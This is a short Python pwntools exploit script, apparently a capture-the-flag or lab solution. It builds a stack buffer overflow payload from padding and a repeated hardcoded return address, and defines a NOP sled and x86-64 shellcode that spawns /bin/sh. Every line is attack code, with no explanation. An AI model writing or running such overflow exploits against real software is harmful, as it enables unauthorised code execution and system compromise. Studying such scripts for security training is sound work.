#!/usr/bin/env python

from pwn import *

nopsled = '\x90' * 100

shellcode = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e' + \
			'\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89' + \
			'\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

# print nopsled + shellcode

RET = p32(0xfff49f2b + 30)

payload = ''
payload += 'A' * 256
payload += 'B' * 12
payload += RET * 6

print '-1'
print payload + '\x00'